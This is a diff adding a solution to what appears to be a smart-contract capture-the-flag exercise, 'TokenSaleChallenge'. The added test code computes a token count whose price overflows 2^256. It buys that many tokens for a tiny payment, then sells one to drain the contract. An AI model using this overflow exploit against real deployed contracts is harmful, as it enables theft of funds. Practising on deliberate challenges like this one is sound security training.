@@ -28,6 +28,19 @@ describe('TokenSaleChallenge', () => {
      * YOUR CODE HERE
      * */
 
+    console.log('target: ', target.address);
+
+    const MAX_INT = ethers.BigNumber.from(2).pow(256);
+    const PRICE_PER_TOKEN = ethers.BigNumber.from(10).pow(18);
+    const numTokens = MAX_INT.div(PRICE_PER_TOKEN).add(1);
+    const msgValue = numTokens.mul(PRICE_PER_TOKEN).sub(MAX_INT);
+
+    // console.log('numTokens: ', numTokens.toString());
+    // console.log('msg.value: ', msgValue.toString());
+
+    await target.buy(numTokens.toString(), { value: msgValue.toString() });
+    await target.sell(1);
+
     expect(await target.isComplete()).to.equal(true);
   });
 });
